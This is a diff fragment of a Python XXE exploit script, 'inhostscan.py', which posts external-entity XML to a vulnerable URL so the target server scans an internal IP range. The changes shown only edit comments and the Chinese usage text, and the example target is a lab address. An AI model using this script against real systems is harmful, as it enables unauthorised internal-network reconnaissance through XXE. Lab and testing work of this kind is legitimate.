@@ -10,7 +10,7 @@ def XXE(url,ip,string):
 		xml = xml + "\r\n" + """<xml>"""
 		xml = xml + "\r\n" + """    <stuff>&xxe;</stuff>"""
 		xml = xml + "\r\n" + """</xml>"""
-		x = requests.post(url, data=xml, headers=headers, timeout=5).text	#记得修改靶机地址
+		x = requests.post(url, data=xml, headers=headers, timeout=5).text
 		coded_string = x.split(' ')[-2]
 		print(' [+]',ip,'Successfully Found !!!')
 	except:	
@@ -25,7 +25,7 @@ if __name__ == '__main__':
 		ip_s = sys.argv[2]
 	except:
 		print('''
-用法：python3 inhostscan.py 漏洞网址 带扫描的IP段
+用法：python3 inhostscan.py 漏洞地址 待扫描的IP段
 示例：python3 inhostscan.py http://192.168.38.132/xxe_test.php 192.168.38
 				''')
 	for i in range(1, 255):
